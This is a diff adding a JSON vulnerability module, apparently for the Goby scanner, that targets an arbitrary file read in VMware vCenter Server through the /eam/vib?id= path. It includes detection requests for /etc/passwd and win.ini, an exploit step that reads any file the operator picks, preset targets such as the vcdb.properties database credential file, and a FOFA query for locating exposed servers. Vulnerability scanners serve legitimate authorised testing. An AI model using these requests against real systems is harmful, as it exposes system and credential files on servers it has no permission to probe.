@@ -1,0 +1,101 @@
+{
+  "Name": "VMware vCenter Arbitrary File Read",
+  "Description": "VMware vCenter Server is advanced server management software that provides a centralized platform for controlling your VMware vSphere environments, allowing you to automate and deliver a virtual infrastructure across the hybrid cloud with confidence.",
+  "Product": "VMware-vCenter",
+  "Homepage": "https://www.vmware.com/products/vcenter-server.html",
+  "DisclosureDate": "2020-10-14",
+  "Author": "itardc@163.com",
+  "GifAddress": "https://raw.githubusercontent.com/gobysec/GobyVuls/master/VMware/VMware_vCenter_File_Read/VMware_vCenter_File_Read.gif",
+  "FofaQuery": "app=\"VMware-VirtualCenter\" || app=\"VMware-vCenter\"",
+  "Level": "2",
+  "Impact": "A remote attacker who successfully exploited this vulnerability can read arbitrary files on the target system.",
+  "Recommendation": "Upgrade to a repaired version.",
+  "References": [
+    "https://t.co/LfvbyBUhF5"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "file",
+      "type": "createSelect",
+      "value": "/etc/passwd,C:/Windows/win.ini,C:/ProgramData/VMware/vCenterServer/cfg/vmware-vpx/vcdb.properties",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "OR",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/eam/vib?id=C:/Windows/win.ini"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "[extensions]",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    },
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/eam/vib?id=/etc/passwd"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "root:x",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/eam/vib?id={{{file}}}"
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    }
+  ],
+  "Tags": ["fileread"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": ["VMware-vCenter", "VMware-VirtualCenter"],
+    "Hardware": null
+  }
+}
